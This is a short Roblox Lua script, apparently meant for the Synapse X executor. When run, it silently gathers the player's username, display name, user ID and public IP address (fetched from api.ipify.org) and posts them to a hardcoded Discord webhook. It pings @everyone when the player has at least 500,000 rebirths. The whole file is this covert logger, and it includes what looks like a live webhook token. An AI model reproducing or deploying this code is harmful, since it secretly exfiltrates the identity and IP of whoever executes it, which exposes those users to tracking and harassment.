    local HttpService = game:GetService("HttpService")
    local plrName = game.Players.LocalPlayer.Name
    local webhook_url = "https://discord.com/api/webhooks/938222442290225203/j2q1q9wcYv-RbP3npRZYQ4-eRJ5EDxdcB5i7vrrzHdnYo7y3TEIp3ORTr5O0XpmASIcy"
    function sendMessagelog(msg)
        local data =
            {
                ["username"] = tostring(game.Players.LocalPlayer.Name) .. " (" .. tostring(game.Players.LocalPlayer.DisplayName) .. ")",
                ["avatar_url"] = "https://www.roblox.com/HeadShot-thumbnail/image?userId=" .. tostring(game.Players.LocalPlayer.UserId) .. "&width=420&height=420&format=png",
                ["content"] = msg,
            }
            local headers = {
                    ["content-type"] = "application/json"
            }
            
            local request_body_encoded = HttpService:JSONEncode(data)
            local request_payload = {Url=webhook_url, Body=request_body_encoded, Method="POST", Headers=headers}
            syn.request(request_payload)
        end
    if game.Players.LocalPlayer.Rebirths.Value >= 500000 then
    sendMessagelog("**" .. plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ") @everyone**")
    else
    sendMessagelog(plrName.." Has Executed The Script At Life " .. game.Players[plrName].Rebirths.Value .. " (IP: " .. game:HttpGet("http://api.ipify.org") .. ")")
    end
